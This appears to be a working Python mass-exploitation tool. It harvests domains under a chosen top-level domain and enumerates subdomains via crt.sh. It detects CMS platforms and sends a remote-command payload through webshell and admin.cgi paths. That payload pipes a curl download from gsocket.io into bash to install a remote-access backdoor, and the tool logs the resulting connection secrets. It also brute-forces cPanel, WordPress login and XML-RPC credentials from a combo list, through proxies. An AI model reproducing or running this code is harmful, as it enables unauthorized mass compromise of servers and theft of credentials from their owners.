
import subprocess
import requests
import time
import re
import urllib3
import dns.resolver
from colorama import Fore, Style, init
import base64
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException, SSLError, ConnectionError
from urllib3.exceptions import NewConnectionError, MaxRetryError, InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)
init(autoreset=True)

yellow = Fore.YELLOW
red = Fore.RED
clear = Style.RESET_ALL
yellow = Fore.YELLOW + Style.BRIGHT

print(yellow + "[======================================================]")
print(yellow + "        Grabber, Subfinder, CMS Scanner & RCE")
print(yellow + "                Version  : 1.0")
print(yellow + "            HCK.BB ft LSC")
print(yellow + "[======================================================]")
print(Style.RESET_ALL)

cms_dict = {
    'WordPress': ['wp-content', 'wp-includes'],
    'Joomla': ['Joomla', 'index.php?option=com_content'],
    'Drupal': ['Drupal', 'sites/all'],
    'Moodle': ['Moodle'],
    'Magento': ['Magento'],
    'Blogger': ['blogspot'],
    'TYPO3': ['typo3/'],
}

def find_subdomains_with_crtsh(domain):
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            return []
        results = response.json()
        subdomains = set()
        for item in results:
            name = item.get("name_value", "")
            for entry in name.splitlines():
                if domain in entry:
                    subdomains.add(entry.strip())
        return list(subdomains)
    except Exception:
        return []

def ensure_http(url):
    return f"http://{url}" if not url.startswith(("http://", "https://")) else url

def save_to_file(filename, url):
    cleaned_url = url.replace("http://", "").replace("https://", "").replace("www.", "")
    with open(filename, "a") as file:
        file.write(cleaned_url + "\n")

def scan_cms(url):
    cms_found = False
    try:
        cms_response = requests.get(url, timeout=5)
        for cms, keywords in cms_dict.items():
            if any(keyword in cms_response.text for keyword in keywords):
                cms_found = True
                print(f"[{yellow}*{clear}] {url} [ {yellow}{cms} Detected{clear} ]")
                save_to_file(f"{cms.lower()}.txt", url)
                break
        if not cms_found:
            save_to_file("no_cms_detected.txt", url)
    except requests.RequestException:
        return

def parse_proxy(proxy_string):
    parts = proxy_string.split(':')
    if len(parts) == 2:
        return {
            "http": f"http://{parts[0]}:{parts[1]}",
            "https": f"https://{parts[0]}:{parts[1]}"
        }
    elif len(parts) == 4:
        proxy_host = parts[0]
        proxy_port = parts[1]
        proxy_user = parts[2]
        proxy_pass = parts[3]
        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    else:
        raise ValueError(f"Invalid proxy format: {proxy_string}")

def load_proxies(file_path):
    proxies = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    proxies.append(parse_proxy(line))
    except FileNotFoundError:
        return proxies
    return proxies

def process_domain(domain, paths, command, proxies=None):
    domain = domain.strip()
    proxy_dict = None
    if proxies:
        proxy = proxies[0]
        proxy_dict = proxy

    for path in paths:
        url_https = f"https://{domain}{path}{command}"
        url_http = f"http://{domain}{path}{command}"
        try:
            response = requests.get(url_https, timeout=120, verify=False, proxies=proxy_dict)
            if response.status_code != 200:
                response = requests.get(url_http, timeout=120, proxies=proxy_dict)
            if response.status_code == 200:
                print(f"Request succeeded for URL: {domain}")
                cleaned_output = response.text.replace('\\\"', '"').replace("\\'", "'")
                match = re.search(r'gs-netcat -s ["\']([a-zA-Z0-9]+)["\'] -i', cleaned_output)
                if match:
                    extracted_code = match.group(0)
                    print(f"{domain} GSOCKET {extracted_code}")
                    with open("gsvuln.txt", "a") as file:
                        file.write(f"{domain} || {extracted_code}\n")
                    return
        except (SSLError, NewConnectionError, MaxRetryError, ConnectionError):
            continue
        except RequestException:
            continue

def search_domains(tld):
    tranco_url = "https://tranco-list.eu/download/65GX/10000000000000000000000000000000000"
    data = get_tranco_data(tranco_url)
    if data:
        domains = [line.split(",")[1] for line in data.splitlines() if line.endswith("." + tld)]
        return domains
    return []

def get_tranco_data(url, retries=3, timeout=10):
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=timeout)
            response.raise_for_status()
            return response.text
        except (requests.exceptions.RequestException, requests.exceptions.ChunkedEncodingError):
            time.sleep(2)
    return None


def brute_force_cpanel(domain, combo_file="combo.txt"):
    url = f"https://{domain}:2083"
    try:
        with open(combo_file, "r") as combos:
            for line in combos:
                if ':' not in line:
                    continue
                username, password = line.strip().split(":", 1)
                credentials = f"{username}:{password}"
                encoded_credentials = base64.b64encode(credentials.encode()).decode()
                headers = {
                    "Authorization": f"Basic {encoded_credentials}",
                    "User-Agent": "Mozilla/5.0"
                }
                response = requests.get(url, headers=headers, verify=False, timeout=5)
                if response.status_code == 200 and "cPanel" in response.text:
                    print(f"[{yellow}?{clear}] Login success: {credentials} on {domain}")
                    save_to_file("cpanel_success.txt", f"{domain} | {credentials}")
                    break
                elif response.status_code == 401:
                    continue
    except Exception as e:
        print(f"[ERROR] {domain}: {e}")


def brute_force_wp_login(domain, combo_file="combo.txt"):
    url = f"http://{domain}/wp-login.php"
    try:
        with open(combo_file, "r") as f:
            for line in f:
                if ':' not in line:
                    continue
                username, password = line.strip().split(":", 1)
                data = {
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": f"http://{domain}/wp-admin/",
                    "testcookie": "1"
                }
                response = requests.post(url, data=data, timeout=5, verify=False, allow_redirects=False)
                if "wp-admin" in response.headers.get("Location", ""):
                    print(f"[{yellow}?{clear}] WP Login success: {username}:{password} on {domain}")
                    save_to_file("wp_login_success.txt", f"{domain} | {username}:{password}")
                    break
    except Exception as e:
        print(f"[ERROR] {domain} (wp-login): {e}")

def brute_force_xmlrpc(domain, combo_file="combo.txt"):
    url = f"http://{domain}/xmlrpc.php"
    headers = {"Content-Type": "text/xml"}
    try:
        with open(combo_file, "r") as f:
            for line in f:
                if ':' not in line:
                    continue
                username, password = line.strip().split(":", 1)
                payload = f'''
                <methodCall>
                  <methodName>wp.getUsersBlogs</methodName>
                  <params>
                    <param><value><string>{username}</string></value></param>
                    <param><value><string>{password}</string></value></param>
                  </params>
                </methodCall>
                '''
                response = requests.post(url, data=payload.strip(), headers=headers, timeout=5, verify=False)
                if "<name>isAdmin</name>" in response.text or "<member>" in response.text:
                    print(f"[{yellow}?{clear}] XMLRPC success: {username}:{password} on {domain}")
                    save_to_file("xmlrpc_success.txt", f"{domain} | {username}:{password}")
                    break
    except Exception as e:
        print(f"[ERROR] {domain} (xmlrpc): {e}")

def main():
    tld = input("Input TLD (e.g., ac.id): ")
    output_file = input("Input Output File Name (e.g., output.txt): ")
    use_proxy = input("Use proxy? (Y/n): ").strip().lower() == 'y'

    proxies = []
    if use_proxy:
        proxies = load_proxies('proxy.txt')

    domains = search_domains(tld)
    paths = [
        "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=",
        "/local/moodle_webshell/webshell.php?action=exec&cmd="
    ]
    command = "bash -c \"$(curl -fsSL https://gsocket.io/y)\""

    for domain in domains:
        print(f"[{yellow}+{clear}] Grabbing: {domain}")
        subdomains = find_subdomains_with_crtsh(domain)
        print(f"[DEBUG] {len(subdomains)} subdomain ditemukan untuk {domain}")
        all_domains = [domain] + subdomains

        with ThreadPoolExecutor(max_workers=100) as executor:
            for result in all_domains:
                url = ensure_http(result)
                executor.submit(scan_cms, url)
                executor.submit(process_domain, result, paths, command, proxies if use_proxy else None)

    print(f"Results saved to {output_file}")

if __name__ == "__main__":
    main()
